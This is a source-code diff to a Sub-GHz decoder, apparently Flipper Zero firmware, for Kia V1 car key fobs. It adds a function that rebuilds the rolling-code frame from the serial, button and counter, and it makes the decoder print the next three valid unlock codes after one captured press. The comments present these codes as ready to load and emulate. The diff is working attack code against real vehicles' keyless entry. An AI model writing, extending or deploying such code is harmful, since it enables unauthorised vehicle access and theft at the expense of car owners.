@@ -8,6 +8,7 @@
 #define KIA_V1_TOTAL_BURSTS       3
 #define KIA_V1_INTER_BURST_GAP_US 25000
 #define KIA_V1_HEADER_PULSES      90
+#define KIA_V1_PREDICT_COUNT      3U
 #define KIA_V1_UPLOAD_CAPACITY                                                    \
     ((KIA_V1_TOTAL_BURSTS *                                                        \
       ((KIA_V1_HEADER_PULSES * 2) + 1 /*start*/ + 1 /*anchor*/ + ((57U - 1U) * 2))) + \
@@ -125,6 +126,30 @@ static void kia_v1_check_remote_controller(SubGhzProtocolDecoderKiaV1* instance)
 
     instance->crc = cnt_high << 4 | crc;
     instance->crc_check = (crc == (instance->generic.data & 0xF));
+}
+
+// Deterministic rolling-code generator: re-assembles the 57-bit frame for an
+// absolute 12-bit counter, reusing the file-static kia_v1_crc4() checksum — the
+// exact assembly performed by kia_protocol_encoder_v1_get_upload(). The counter
+// is plaintext and the low nibble is a reversible XOR-nibble checksum (no secret
+// key), so the next press is predictable from a single capture. Lives outside
+// ENABLE_EMULATE_FEATURE (like kia_v1_crc4) so decode-only builds can predict
+// upcoming codes.
+static uint64_t kia_v1_predict_key(uint32_t serial, uint8_t btn, uint16_t cnt_next) {
+    cnt_next &= 0x0FFF;
+    uint8_t cnt_high = (cnt_next >> 8) & 0xF;
+    uint8_t char_data[7];
+    char_data[0] = (serial >> 24) & 0xFF;
+    char_data[1] = (serial >> 16) & 0xFF;
+    char_data[2] = (serial >> 8) & 0xFF;
+    char_data[3] = serial & 0xFF;
+    char_data[4] = btn;
+    char_data[5] = cnt_next & 0xFF;
+    char_data[6] = cnt_high;
+    uint8_t crc = kia_v1_crc4(char_data, 7, 1);
+
+    return (uint64_t)serial << 24 | (uint64_t)btn << 16 | (uint64_t)(cnt_next & 0xFF) << 8 |
+           (uint64_t)cnt_high << 4 | crc;
 }
 
 static const char* kia_v1_get_button_name(uint8_t btn) {
@@ -544,4 +569,23 @@ void kia_protocol_decoder_v1_get_string(void* context, FuriString* output) {
         instance->crc_check ? "OK" : "WRONG",
         instance->generic.btn,
         kia_v1_get_button_name(instance->generic.btn));
+
+    // Weak rolling code (12-bit plaintext counter + reversible XOR-nibble
+    // checksum, no secret key): predict the next few codes by re-assembling the
+    // frame with cnt+i (masked to 12 bits, wrapping). Each key is byte-correct
+    // (crc recomputed) so it is ready to load/emulate/save. Guarded on a valid
+    // decode (crc_check) so it only runs when serial/cnt are populated.
+    if(instance->crc_check) {
+        for(uint16_t i = 1; i <= KIA_V1_PREDICT_COUNT; i++) {
+            uint16_t cnt_next = (uint16_t)((instance->generic.cnt + i) & 0x0FFF);
+            uint64_t next_key =
+                kia_v1_predict_key(instance->generic.serial, instance->generic.btn, cnt_next);
+            furi_string_cat_printf(
+                output,
+                "\r\nNext+%u:%06lX%08lX",
+                (unsigned int)i,
+                (uint32_t)(next_key >> 32),
+                (uint32_t)(next_key & 0xFFFFFFFF));
+        }
+    }
 }
